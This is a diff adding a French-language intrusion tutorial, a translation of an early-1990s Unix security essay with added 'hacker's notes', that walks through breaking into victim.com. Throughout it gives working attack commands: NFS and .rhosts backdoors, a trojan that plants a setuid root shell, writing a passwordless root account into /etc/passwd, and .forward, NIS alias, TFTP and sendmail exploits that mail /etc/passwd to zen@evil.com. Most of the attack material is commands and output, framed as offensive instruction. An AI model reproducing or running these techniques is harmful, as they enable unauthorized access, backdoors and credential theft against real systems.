@@ -1,0 +1,764 @@
+Recherche d'informations
+------------------------
+
+Supposons que tu sois l'administrateur systeme de Victim Incoprorated's
+Network.
+Dans un effort de securisation de tes machines, tu demandes a
+l'administreur d'un site proche (evil.com) de te donner un compte sur
+l'une de ses machines pour verifier ton systeme de securite depuis
+l'exterieur.																				
+
+Que vas-tu faire ? D'abord, essaye de rassembler des informations sur
+ton site (la cible). Il y a moult services de reseau a utiliser:
+finger, showmount, et rpcinfo sont de bons points de depart.
+Mais ne t'arrete pas la.
+ --
+Tu devrais utiliser aussi le DNS, whois, sendmail (SMTP), ftp, uucp,
+et tous les autres services que tu peux trouver.
+Il y a tellement de methodes possibles que l'espace manque ici pour
+les aborder toutes, mais nous allons essayer de  montrer un apercu des
+strategies les plus communes et/ou dangereuses que nous avons vu ou 
+auxquelles nous avons pense.
+Normalement, tu devrais trouver de telles informations sur tous les
+sites du sous-reseau ou de la zone d'attaque -- l'information c'est le 
+pouvoir -- mais ici,nous allons examiner uniquement notre cible.
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+                           HACKER'S NOTE
+En fait, avant de hacker un site, le but du jeu est de rassembler un 
+maximum d'informations. Pour ca, tout est bon: visite leur web, regarde
+leur sendmail (vois si leur version est buggee), fais un FTP pour voir
+quel systeme ils utilisent, fais meme un telnet, ...
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+Pour commencer , tu regardes ce que la commande finger te donne:
+(supposons qu'il est 6:00pm, Nov 6, 1993) :
+
+ victim % finger @victim.com
+ [victim.com]
+ Login       Name             TTY Idle     When    Where
+ zen      Dr. Foobar           co   1d  Wed 08:00   death.com
+
+Un seul idle user ; il semble donc que personne ne se rendra compte de quoi que c esoit si 
+nous pénétrons immédiatement
+
+Le service finger est un service tres utile pour recuperer des informations. C'est pour ca 
+que beaucoup d'admins l'enlevent. Mais les informations obtenues ne sont réellement utiles 
+qu'en conjonction avec d'autres données.
+
+Faire un finger sur "@","0", ou "", et sur des noms comme root, bin, ftp, system, guest, 
+demo, manager, etc... peut reveler des informations interessantes. La nature de ces 
+informations dependent de la version de fingerd que votre cible utilise, mais les plus 
+notables sont les noms de login, avec leur répertoire utilisateur et le site depuis lequel 
+il s'est connecte la dernière fois.
+
+Pour avoir d'autres informations, tu peux utiliser ruser (en 
+particulier avec l'option -l) pour obtenir des infos utiles sur les
+utilisateurs qui sont actuellement connectes.
+
+Ces commandes sur victim.com donnent les informations suivantes, 
+presentees sous la forme d'un tableau:  
+ 
+ Login   Home-dir    Shell      Last login, from where
+ -----   --------    -----      ----------------------
+ root    /           /bin/sh    Fri Nov 5 07:42 on ttyp1 from big.victim.com
+ bin     /bin                   Never logged in
+ nobody  /                      Tue Jun 15 08:57 on ttyp2 from server.victim.co
+ daemon  /                      Tue Mar 23 12:14 on ttyp0 from big.victim.com
+ sync    /           /bin/sync  Tue Mar 23 12:14 on ttyp0 from big.victim.com
+ zen     /home/zen   /bin/bash  On since Wed Nov  6 on ttyp3 from death.com
+ sam     /home/sam   /bin/csh   Wed Nov  5 05:33 on ttyp3 from evil.com
+ guest   /export/foo /bin/sh    Never logged in
+ ftp     /home/ftp              Never logged in
+
+On peut remarquer que le compte guest dispose d'un shell est que son 
+home directory est exporte donc accesible par NFS.
+
+Notre experience avec SATAN et l'observation de crackers de syteme au
+travail, nous ont prouve que finger etait l'un des services les plus
+dangereux, parcequ'il est tres utile pour enqueter sur la cible 
+potententielle. Cependant, la plupart de ces informations ne sont 
+utiles qu'utilisees en conjonction avec d'autres donnees.
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+
+Par exemple, showmount sur notre cible donne:
+
+ evil % showmount -e victim.com
+ export list for victim.com:
+ /export                            (everyone)
+ /var                               (everyone)
+ /usr                               easy
+ /export/exec/kvm/sun4c.sunos.4.1.3 easy
+ /export/root/easy                  easy
+ /export/swap/easy                  easy
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+                            HACKER'S NOTE
+La commande showmount avec l'option -e hostname permet de connaitre les
+systemes de fichiers effectivement exportes par le systeme distant
+hostname.
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+Remarque que /export/foo est exporte pour tout le monde. Remarque
+egalement que c'est le repertoire utilisateur de "guest". Il est temps
+pour nous de rentrer dans la machine ! Dans le cas present, tu va monter
+(mount) le repertoire utilisateur de "guest". Comme tu n'as pas de
+compte correspondant sur la machine locale et comme le root ne peut pas
+modifier les fichiers sur un systeme de fichiers monte avec NFS, tu cree
+un compte "guest" dans ton fichier /etc/passwd local. En tant
+qu'utilisateur guest tu peut mettre un fichier .rhosts dans le repertoire
+utisateur distant de "guest", ce qui te permet de faire un login sur la
+machine cible sans donner de mot de passe.
+
+
+
+ evil # mount victim.com:/export/foo /foo
+ evil # cd /foo
+ evil # ls -lag
+ total 3
+    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
+    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
+    1 drwx--x--x  9 10001    daemon       1024 Aug  3 15:49 guest
+ evil # echo guest:x:10001:1:temporary breakin account:/: >> /etc/passwd
+ evil # ls -lag
+ total 3
+    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
+    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
+    1 drwx--x--x  9 guest    daemon       1024 Aug  3 15:49 guest
+ evil # su guest
+ evil % echo evil.com >> guest/.rhosts
+ evil % rlogin victim.com
+	 Welcome to victim.com!
+ victim %
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+                           
+			   HACKER'S NOTE
+En fait comme tu as pu le voir avec la commande showmount, le 
+repertoire /export est accesible a tous et comme le repertoire 
+de l'utilisateur guest est dans /export/foo tu as acces a son home
+directory.
+En suite l'astuce consiste a mettre un fichier .rhosts (le fichiers
+.rhosts est le fichiers d'autorisation des r-commandes. ex: voici un 
+fichier .rhosts qui  appartient a l'user nico de chez X.com:
+
+   # .rhosts
+   # hostname logname
+   bibi.com paul
+   bibi.com  linda
+
+Cela veut dire que l'utilisateur paul de la machine bibi.com a le droit
+de faire des r-commandes chez X.com et pareil pour linda.
+Si tu mets "+ +" dans le .rhosts, tu permets a tout le monde d'acceder 
+a cette machine.)  
+Donc tu mets un fichier .rhosts contenant "+ +" dans le home directory
+de l'utilisateur guest se qui ensuite va te permetre de te connecter a
+victim.com juste en faisant un rlogin (la commande rlogin permet de se
+logger sur une machine unix distante sans avoir a donner de mot de passe
+si on est declare dans le .rhosts de l'user ou le /etc/hosts (mais qui
+n'est accesible que au root :(..).
+
+Par exemple, reprenons le cas de nico de chez X.com. Il y a linda de
+chez bibi.com qui est declaree, donc moi je deviens linda de chez 
+bibi.com et je veux me logger chez X.com: 
+je fais ceci:
+   
+   rlogin X.com -l nico  
+
+Et hop! Je suis logge. :) Si nico de X.com avait mis "+ +" dans son 
+.rhosts, tout le monde pourrait se logger).
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+
+Si, a la place des repertoires utilisateur, victim.com exportait un
+systeme de fichiers avec des commandes utilisateur (/usr ou 
+/usr/local/bin par exemple), tu pourrais remplacer une commande par un 
+cheval de troie (trojan) qui executerait les commandes de ton choix.
+Le prochain utilisateur a executer cette commande executerait ton 
+programme.
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+                            HACKER'S NOTE
+Un cheval de troie est en fait un programme qui va te permettre 
+d'executer des actions a l'insu de l'utilisateur. Voici un exemple de
+cheval de troie:
+   
+   $ cat lss 
+   #!/bin/sh
+   echo "+ +" > ~/.rhosts
+   echo "command not found"
+   $
+   
+Cela veut dire que chaque fois qu'un user tapera lss au lieu de ls, il
+executera notre cheval de troie qui comme vous l'avez vu met "+ +" dans
+le .rhosts de son repertoire. :)
+
+Ah, oui! Un truc a verifier lorsque tu hackes une machine dans laquelle
+tu te trouves, regarde la variable PATH
+
+   $ echo $PATH
+   $.:/usr/local.bin:/bin: etc etc 
+
+Si tu as bien vu le '.' au debut de la variable PATH, cela veut dire
+que le shell cherchera d'abord le programme dans le repertoire courant
+et ensuite dans /usr/local/bin, etc... C'est un enorme trou de securite.
+Voici un exemple de cheval de troie qui exploite se bug:
+
+   #!/bin/sh
+   
+ # La on met un "+ +" dans .rhosts histoire de se faire une backdoor
+   
+   echo "+ +" > $HOME/.rhosts >/dev/null
+   chmod 666 $HOME > /dev/null 
+   
+ # On rend son rep "world writable" :)~~
+   
+   echo $LOGNAME > /tmp/... >/dev/null 
+   
+ # On met les noms des victimes  8›)
+   
+   if test $LOGNAME = root  
+   
+ # On regarde si c'est le root qui a execute le programme
+   
+   then
+   chmod 666 /etc/passwd         
+   
+ # Bon, ca peut nous servir ;) 
+   
+   cp /bin/sh  /usr/users/bibi/.../.temp > /dev/null
+   
+ # La, on va mettre un shell ROOT dans un repertoire impossible :)
+   
+   chown root /usr/users/bibi/.../.temp >/dev/null   
+   
+ # On l'installe
+   
+   chmod 4777 /usr/users/bibi/.../.temp >/dev/null   
+ 
+ # On le met suid ROOT
+ 
+   fi
+ 
+ # Il s'agit qu'il execute son ls aussi :))
+   
+   mv /tmp/ls  $HOME/.X23E4 > /dev/null  
+   mv /tmp/...  $HOME/...  > /dev/null     
+ 
+ # On deplace notre trojan
+ 
+   ls $*              
+   
+ # Allez, on lui envoie son ls :))
+   
+   mv $HOME/.X23E4 /tmp/ls > /dev/null   
+   mv $HOME/...   /tmp/... > /dev/null         
+ 
+ # On remet notre trojan 
+ # Bon! On est bien, alors on se casse...
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+Nous suggerons que les systemes de fichiers soient exportes:
+  - read/write seulement a certains clients de confiance.
+  - read-only, quand c'est possible (les donnees ou les programmes
+    peuvent souvent etre exportes de cette maniere). 
+
+
+
+Si la cible a un '+' dans son fichier /etc/hosts.equiv (mis par defaut
+sur les machines de certains vendeurs) ou a le network bug (CERT 
+advisory 91:12), n'importe quel utilisateur (sauf le root) avec un login
+sur le fichier passwd de la cible peut faire un rlogin sur la cible sans
+donner de mot de passe.
+Et comme l'utilisateur "bin" possede souvent des fichiers et des 
+repertoires importants, ta prochaine attaque est d'essayer de rentrer 
+sur le site cible et de modifier le fichier passwd pour te laisser avoir
+un acces root.
+
+D'abors on se met en user bin:
+
+   evil % whoami 
+   bin
+   evil % rsh victim.com csh -i
+   Warning: no access to tty; thus no job control in this shell...
+   victim %  ls -ldg /etc
+   
+   drwxr-sr-x  8 bin      staff        2048 Jul 24 18:02 /etc
+   
+   victim % cd /etc
+   victim % mv passwd pw.old
+   victim % (echo toor::0:1:instant root shell:/:/bin/sh;\
+   > cat pw.old) > passwd
+   victim % ^D
+   evil % rlogin victim.com -l toor
+	 Welcome to victim.com!
+   victim #
+ 
+
+Quelques remarques sur la methode utilisee ci-dessus;
+"rsh victim.com csh -i" est utilise pour aller sur le systeme parce que
+ca ne laisse aucune trace dans les fichiers de surveillance wtmp et 
+utmp, de sorte que le rsh est invisible pour finger et who. Cependant, 
+le shell distant n'est pas attache a un pseudo-terminal, ce qui fait
+que les programmes comme les pagers et les editeurs ne marcheront pas 
+-- mais c'est tres utile pour de breves explorations.
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+                            HACKER'S NOTE
+La comande rsh est une r-commande. Elle permet l'execution d'une 
+commande a distance, par exemple:
+
+   (on reprends le .rhosts de nico chez X.com)
+   La on veut executer "mail peutimporte@coco.com < /etc/passwd" 
+   chez X.com, on va donc faire:
+   
+   rsh X.com -l nico cat /etc/passwd
+                                                                                        
+Les fichiers wtmp et utmp sont tres importants car ils gardent une
+trace de tes connexions, etc... Bref se sont les espions de l'admin.
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+Que faire maitenant? Avons-nous explore tous les trous dans le systeme
+cible?
+Non, surement pas. Verifie que d'apres le resultat d'un finger sur ta
+cible il existe un compte "ftp". Nous pouvons penser que le FTP 
+anonymous est en marche. Le FTP anonymous peut etre une voie facile
+pour avoir un acces, car il est souvent mal configure. Par example, la
+cible peut avoir une copie complete du fichier /etc/passwd dans le FTP
+anonymous (repertoire ~ftp/etc , mais c'est plutot rare). Si le 
+repertoire utilisateur FTP de victim.com est writable, il va nous
+permetre d'executer des commandes.
+
+Dans ce cas, on va s'envoyer un mail qui contiendra le fichier
+/etc/passwd , simplement en creant un fichier .forward qui executera
+des commandes quand un mail sera envoye au compte FTP.
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+                           HACKER'S NOTE
+Le programme sendmail utilise le meme mecanisme pour redistribuer le
+courier ou executer divers programmes comme "vacation" (programme qui
+te renvoie ton mail quand tu es absent (il se presente comme ca dans
+le .forward ("|/usr/ucb/vacation username")).
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+   evil % cat forward_sucker_file
+   "|/bin/mail zen@evil.com < /etc/passwd"
+   
+   evil % ftp victim.com
+   Connected to victim.com
+   220 victim FTP server ready.
+   Name (victim.com:zen): ftp
+   331 Guest login ok, send ident as password.
+   Password:
+   230 Guest login ok, access restrictions apply.
+   ftp> ls -lga
+   200 PORT command successful.
+   150 ASCII data connection for /bin/ls (192.192.192.1,1129) (0 bytes).
+   total 5
+   drwxr-xr-x  4 101      1             512 Jun 20  1991 .
+   drwxr-xr-x  4 101      1             512 Jun 20  1991 ..
+   drwxr-xr-x  2 0        1             512 Jun 20  1991 bin
+   drwxr-xr-x  2 0        1             512 Jun 20  1991 etc
+   drwxr-xr-x  3 101      1             512 Aug 22  1991 pub
+   226 ASCII Transfer complete.
+   242 bytes received in 0.066 seconds (3.6 Kbytes/s)
+   ftp> put forward_sucker_file .forward
+   43 bytes sent in 0.0015 seconds (28 Kbytes/s)
+   ftp> quit
+   evil % echo test | mail ftp@victim.com
+
+
+Maitenant, tu n'as plus qu'a attendre que le fichier passwd te soit
+envoye.
+
+Le wuarchive ftpd, un remplacant du daemon FTP mis en circulation par
+l'Universite de Washington , apporte beaucoup de problemes. Si ton
+wuarchive ftpd est plus ancien que le 8 avril 1993 tu dois le remplacer
+par une version plus recente.   
+
+Finalement ce programme est vaguement similaire a FTP/TFTP, ou le 
+Trivial File Transfer Protocol.
+Ce daemon ne demande aucun password pour l'identification. Si un serveur
+donne acces au TFTP sans restriction (souvent, en configurant 
+/etc/inetd.conf), un attaquant peut lire et ecrire dans tous les 
+fichiers dans le systeme entier (il peut cependant ecrire uniquement
+dans les fichiers 666). Dans l'example suivant, on prend /etc/passwd
+pour le mettre dans notre repertoire /tmp .
+
+   evil % tftp
+   tftp> connect victim.com
+   tftp> get /etc/passwd /tmp/passwd.victim
+   tftp> quit
+
+Si aucune des methodes precedentes n'a fonctionne, il est temps d'aller
+vers des mesures plus drastiques. Tu as un nouvel ami: rpcinfo. C'est un
+autre programme utile, parfois meme plus utile que finger. Bien des
+sites proposent des services RPC qui peuvent etre exploites; rpcinfo
+peut parler au portmapper et te montrer le chemin. Il peut te dire si un
+site utilise NIS, si c'est un NIS maitre ou un NIS esclave, si une station
+sans disque est dans le coin, s'il utilise NFS, un service d'information
+(rusersd,rstatd, etc...), ou un autre programme peu commun (de 
+surveillance ou de securite). 
+Retournons a notre cible qui nous sert d'exemple:
+
+   evil % rpcinfo -p victim.com    [output trimmed for brevity's sake]
+    program vers proto   port
+     100004    2   tcp    673  ypserv
+     100005    1   udp    721  mountd
+     100003    2   udp   2049  nfs
+     100026    1   udp    733  bootparam
+     100017    1   tcp   1274  rexd
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+                            HACKER'S NOTE
+rpcinfo est une commande qui vous permet de voir les service RPC qui
+repondent, elle permet surtout de connaitre les numeros de ports qui ont
+ete attribues par le daemon portmapd aux autres daemons RPC.
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+Dans ce cas, tu peux voir plusieurs choses interessantes sur notre 
+cible; tout d'abord qu'il s'agit d'un serveur NIS. Ce n'est peut etre
+pas de notoriete publique, mais une fois que tu connais le nom de 
+domaine NIS s'un serveur, tu peux obtenir n'importe quelle map NIS par
+une simple requete RPC, meme si tu es en dehors du sous-reseau servi par
+le serveur NIS (par exemple, en utilisant le programme YPX qui peut etre
+trouve ici ou la). De plus, un certain de nombre de systemes ont des 
+noms de domaine NIS facile a deviner. Essayer de deviner le nom de
+domaine NIS peut s'averer tres payant. De bons candidats sont le nom du 
+site ("victim" ou bien "victim.com"), le nom de l'organisation, le 
+netgroup name dans le resultat de "showmount", et ainsi de suite...
+Si tu veux voir si le nom de domaine est victim, tu peux taper:
+
+   evil % ypwhich -d victim victim.com  
+   Domain victim not bound.
+
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+                            HACKER'S NOTE
+La commande ypwhich indique quel serveur fournit actuellement un service
+au client designe en argument. Par exemple:
+
+(nous sommes dans un reseau local et nous voulons savoir quelle machine
+est maitre de bibi)
+
+   evil % ypwhich bibi
+   bigbibi
+
+La machine bigbibi est le serveur maitre de bibi.
+
+ATTENTION: voici la syntaxe des commandes a utiliser pour le NIS (comme
+ypcat, ypwich, etc...):
+   
+   ypwhich [-d domainname] hostname
+
+l'option -d permet de designer le domaine.
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+Ceci est un essai infructueux; si tu avais trouve le bon nom de domaine
+cela t'aurait affiche le nom du site du serveur NIS de victim.com en 
+retour.
+Cependant, remarque que le repertoire /var est exporte a tout le monde
+(voir la section NFS). Il suffit de mounter ce repertoire et de regarder
+dans le sous repertoire yp --- entre autres choses tu verras un autre
+sous repertoire qui contient le nom de domaine de la cible.
+
+   evil # mount victim.com:/var /foo
+   evil # cd /foo
+   evil # /bin/ls -alg /foo/yp
+   total 17
+     1 drwxr-sr-x  4 root     staff         512 Jul 12 14:22 .
+     1 drwxr-sr-x 11 root     staff         512 Jun 29 10:54 ..
+    11 -rwxr-xr-x  1 root     staff       10993 Apr 22 11:56 Makefile
+     1 drwxr-sr-x  2 root     staff         512 Apr 22 11:20 binding
+     2 drwxr-sr-x  2 root     staff        1536 Jul 12 14:22 foo_bar
+     .
+     .
+     .
+
+Dans ce cas, le nom de domaine NIS est "foo_bar". 
+
+De plus, les maps NIS contiennent souvent une liste de nom des
+utilisateurs/employes ainsi qu'une liste de site interne, sans parler 
+des mots de passe (en vu de cracking).
+ 
+-------snip-------8<-------snip-------8<-------snip-------8<-------
+
+                            HACKER'S NOTE
+Le service NIS permet a une machine d'aministrer plusieurs autres
+machines, donc elle met en commun une base de donnees pour chaque 
+machine esclave (les maps NIS). Ces maps sont en faite les fichiers 
+/etc/passwd /etc/networks , etc, mais sous format NIS.
+
+Bon tu vas dire: "Mais concretement ca veut dire quoi?"
+
+Par exemple:
+
+  Un mec fait un login sur la machine "palestine_libre", il envoie ses
+  login et mot de passe, mais la machine "palestine_libre" ne regarde
+  pas dans son propre /etc/passwd, elle va faire une requete pour
+  consulter la map NIS 'passwd', qui est en fait un gros /etc/passwd
+  mais commun a tous. Ensuite elle va dire au mec si il a ou pas le 
+  droit de rentrer.
+
+Donc la faille est que n'importe qui peut consulter les maps NIS d'un
+site, il lui suffit juste de savoir le nom du domaine NIS. :)
+
+Par exemple:
+  
+  Nous voulons voir la map NIS "passwd" de chez bibi.com, nous savons
+  que que le nom de la machine est bibi donc nous n'avons plus qu'a 
+  faire ca:
+
+   $ ypcat -d bibi.bibi.com passwd
+  
+  Et hop! Le fichier passwd va s'afficher, on a plus qu'a le prendre et
+  le passer a la moulinette.
+
+Note que rpcinfo regarde si victim.com fais marcher rexd. Comme le 
+daemon rsh, rexd envoie des requetes de la forme "stp execute cette
+commande en tant que cet user-la". Cependant, rexd ne prend pas en 
+compte les fichiers hosts.equiv ou le .rhosts. Normallement, le client
+qui se connecte a rexd est "on" (en fait la verification de l'identite 
+se fais par le client "on"), mais un simple programme C peut 
+facilement envoyer n'importe quelle information sur l'user au serveur
+rexd (faire tourner rexd correspond en fait a pas avoir de password). ;)
+
+Alors que nous regardons le resultat de la commande rpcinfo, tu peux 
+voir que victim.com semble avoir aussi des stations sans disque. Le 
+bootparam service est donc surement utilise, il donne a la station sans
+disque l'acces aux informations pour qu'elle puisse booter. Utilisons
+BOOTPARAMPROC_WHOAMI et fournissons l'adresse du client. Nous pouvons
+obtenir ainsi son nom de domaine NIS. Cela peut etre tres utile pour
+l'obtension des maps NIS (comme le fichier passwd), connaissant le nom
+de domaine.
+
+Voici un exemple de code qui fait ca:
+
+    char   *server;
+    struct bp_whoami_arg arg;           /* query */
+    struct bp_whoami_res res;           /* reply */
+ 
+    /* initializations omitted... */
+ 
+    callrpc(server, BOOTPARAMPROG, BOOTPARAMVERS, BOOTPARAMPROC_WHOAMI,
+            xdr_bp_whoami_arg, &arg, xdr_bp_whoami_res, &res);
+
+    printf("%s has nisdomain %s\n", server, res.domain_name);
+
+
+Le resultat du showmount nous indique que "easy" est une station sans 
+disque, donc nous utilisons son adresse dans la requete
+BOOTPARAMPROC_WHOAMI:
+
+   evil % bootparam victim.com easy.victim.com
+   victim.com has nisdomain foo_bar
+
+Le maitre NIS controle les alias mail pour le domaine NIS en question. 
+De la meme maniere que les fichiers alias locaux, tu peux creer des 
+alias mail qui executeront des commandes, quand du courier leur sera
+envoye (un exemple est l'alias "decode" qui UUDECODE le courier qu'on 
+lui envoie). Ici, par exemple, nous creons un alias "foo" qui envoie le
+fichier /etc/passwd a evil.com des la reception d'un mail.
+                                                                                        
+   nis-master # echo 'foo: "| mail zen@evil.com < /etc/passwd "' >>\
+   > /etc/aliases
+   nis-master # cd /var/yp
+   nis-master # make aliases
+   nis-master # echo test | mail -v foo@victim.com
+
+
+Si un hacker a le controle de votre maitre NIS, il a egalement le
+controle des sites clients du NIS.
+
+Il n'y a pas beaucoup de defenses efficaces contre les attaques NIS.
+C'est un service peu sur qui n'a presque pas d'authentification entre le
+client et le serveur. Pire encore, il semble assez clair que des maps
+peuvent etre recuperees meme sur les serveur maitre (c'est a dire qu'il 
+est possible de traiter un serveur NIS comme un client). Ceci evidemment
+corrompt le systeme entier. S'il est absolument necessaire d'utiliser 
+NIS, choisir un nom de domaine difficile a deviner peut etre d'un
+certain secours, mais si vous faites marcher des stations sans disque
+qui sont exposees a des attaques potentielles alors il est trivial pour
+un attaquant de venir a bout de cette precaution en utilisant le truc du
+bootparam pour obtenir le nom de domaine.
+Si NIS est utilise pour centraliser les maps passwd, alors les shadow-
+passwords ne servent a rien parce qu'ils sont toujours accessibles pour 
+un attaquant qui est root sur le site qui vous attaque. Le mieux est 
+d'utiliser NIS le moins possible ou au moins de realiser que les maps
+peuvent etre lues par une force hostile.
+
+Secure RPC diminue la menace de beaucoup mais a aussi ses propres defauts.
+Tout d'abord, il est dificile a administrer, mais aussi ses methodes
+cryptographiques ne sont pas tres solides. Il semble que NIS+ ait fixe la
+plupart de ces problemes.
+
+Le portmapper ne connait que les services RPC. Les autres services reseau
+peuvent etre localises avec des methodes brutales (connexion a tous les
+ports pour verifier ceux qui repondent). Plusieurs utilitaires reseau
+ecoutent des ports specifiques (sendmail sur le 25, telnet sur le 23,
+X-windows sur le 6000). SATAN inclue un programme qui scanne les ports 
+sur un site distant et fait un rapport.
+
+   evil % tcpmap victim.com
+   Mapping 128.128.128.1
+   port 21: ftp
+   port 23: telnet
+   port 25: smtp
+   port 37: time
+   port 79: finger
+   port 512: exec
+   port 513: login
+   port 514: shell
+   port 515: printer
+   port 6000: (X)
+
+Ceci suggere que victim.com fait tourner Xwindows. S'ils ne sont pas 
+proteges correctement (avec les magic cookies ou les mecanismes xhosts),
+l'affichage des fenetres peux etre captures ou regardes, les touches 
+pressees par les utilisateur peuvent etre espionees, les programmes 
+executes a distance, etc... De plus, si la cible fais tourner X et 
+accepte les connexions telnet sur le port 6000, cela peut etre utilise 
+pour une attaque "DENIAL OF SERVICE", le systeme de fenetre cible etant
+souvent paralyse pour une courte duree. Une methode pour determiner la
+vulnerabilite du serveur X et de s'y connecter avec la fonction
+WOpenDisplay(). Si la fonction retourne NULL, alors tu ne peut pas
+acceder a l'affichage de la victime (WOpenDisplay fait partie de SATAN).
+ 
+    char   *hostname;
+
+    if (XOpenDisplay(hostname) == NULL) {
+       printf("Cannot open display: %s\n", hostname);
+       } 
+    else {
+       printf("Can open display: %s\n", hostname);
+       }
+
+   evil % opendisplay victim.com:0
+   Cannot open display: victim.com:0
+
+
+Les terminaux X, meme s'ils sont moins puissants qu'un systeme UNIX 
+complet, peuvent avoir leurs propres problemes de securite. Certain 
+terminaux X permettent des acces rsh non restreints, te permettant de
+demarrer un programme client X dans le terminal de la victime avec
+l'affichage apparaissant sur ton propre ecran.
+
+   evil % xhost +xvictim.victim.com
+   evil % rsh xvictim.victim.com telnet victim.com -display evil.com
+
+Dans tous les cas, nous pouvons penser que la securite windows dans 
+vos utilisateurs reseau et votre systeme de fichiers peuvent etre aussi
+dangereux qu'un "+3" dans votre hosts.equiv ou un acces root sans 
+password.
+                                                                
+Ensuite tu examines sendmail. Sendmail est un programme tres complexe
+qui as une longue histoire de problemes de securite derriere lui, 
+notamment la fameuse commande "wiz" (heureusement retiree depuis 
+longtemps de toutes les machines).
+
+   evil % telnet victim.com 25
+   connecting to host victim.com (128.128.128.1.), port 25
+   connection open
+   220 victim.com Sendmail Sendmail 5.55/victim ready at Fri, 6 Nov 93 18:00 PDT
+   expn decode
+   250 <"|/usr/bin/uudecode">
+   quit
+
+Faire marcher l'alias "decode" est un risque de securite. Il permet aux
+attaqueurs potentiels d'ecraser n'importe quel fichier qui est writable
+par le posseseur de l'alias --- souvent un daemon, mais potentielement 
+n'importe quel utilisateur. Observe se morceau de courier --- il va 
+placer "evil.com" dans le fichier .rhosts de l'utilisateur "zen" si 
+celui-ci est writable:
+
+   evil % echo "evil.com" | uuencode /home/zen/.rhosts | mail \
+   > decode@victim.com
+
+Si aucun repertoire utilisateur n'est connu ou writable, une variation 
+interessante consiste a creer un fichier /etc/allises.pag qui contient
+une commande que tu desires executer sur la cible. Cela peut marcher car
+sur plusieurs systemes les fichiers aliases.pag et aliases.dir qui 
+controlent les alias du mail sont writable par tous.
+
+   evil % cat decode
+   bin: "| cat /etc/passwd | mail zen@evil.com"
+   evil % newaliases -oQ/tmp -oA`pwd`/decode
+   evil % uuencode decode.pag /etc/aliases.pag | mail decode@victom.com
+   evil % /usr/lib/sendmail -fbin -om -oi bin@victim.com < /dev/null.
+
+Beaucoup de choses peuvent etre trouvees juste en demandant a sendmail
+si une adresse est acceptable (vrfy), ou en quoi une adresse se 
+developpe (expn). Quand les services rusers et finger ne sont pas 
+presents, vrfy et expn peuvent toujours etre utilises pour identifier
+les comptes utilisateur (cible potentielle). Vrfy et expn peuvent 
+egalement etre utilises pour determiner si l'utilisateur filtre son mail
+a travers un programme qui peut etre exploite (par exemple:vacation, 
+mail sorters, etc...). Cela peut etre une bonne idee de suprimmer les
+commandes "vrfy" et "expn".
+
+Il y a deux bugs bien connus qui devraient etre testes. Le premier a ete
+definitivement supprime dans la version 5.59 de berkley; pour les 
+versions de sendmail anterieures a la 5.59, "evil.com" est ajoute,
+malgre le message d'erreur, avec le header au fichier specifie.
+ 
+   % cat evil_sendmail
+   telnet victim.com 25 << EOSM
+   rcpt to: /home/zen/.rhosts
+   mail from: zen
+   data
+   random garbage
+   .
+   rcpt to: /home/zen/.rhosts
+   mail from: zen
+   data
+   evil.com
+   .
+   quit
+   EOSM
+
+   evil % /bin/sh evil_sendmail
+   Trying 128.128.128.1
+   Connected to victim.com
+   Escape character is '^]'.
+   Connection closed by foreign host.
+
+   evil % rlogin victim.com -l zen
+	 Welcome to victim.com!
+   victim %
+
+
+La seconde faille, suprimee seulement recemment, permet a n'importe qui
+de specifier une commande shell et/ou "PATHNAMES" (voir plus bas) et/ou
+une adresse de destination. Les tentatives pour garder les details 
+secrets ont ete vaines et les discussions dans les mailling lists et 
+dans les newsgroups ont mene a la revelation de l'exploitation de ce 
+bug. C'est ainsi qu'avec bien des bugs UNIX, pratiquement tous les
+sendmail etaient vulnerables car ils partagent la meme sructure generale
+de code. Une attaque typique pour extraire le fichier passwd devrait
+ressembler a ca:
+   
+   evil % telnet victim.com 25
+   Trying 128.128.128.1...
+   Connected to victim.com
+   Escape character is '^]'.
+   220 victim.com Sendmail 5.55 ready at Saturday, 6 Nov 93 18:04
+   mail from: "|/bin/mail zen@evil.com < /etc/passwd"
+   250 "|/bin/mail zen@evil.com < /etc/passwd"... Sender ok
+   rcpt to: nosuchuser
+   550 nosuchuser... User unknown
+   data
+   354 Enter mail, end with "." on a line by itself
+   .
+   250 Mail accepted
+   quit
+   Connection closed by foreign host.
+   evil %
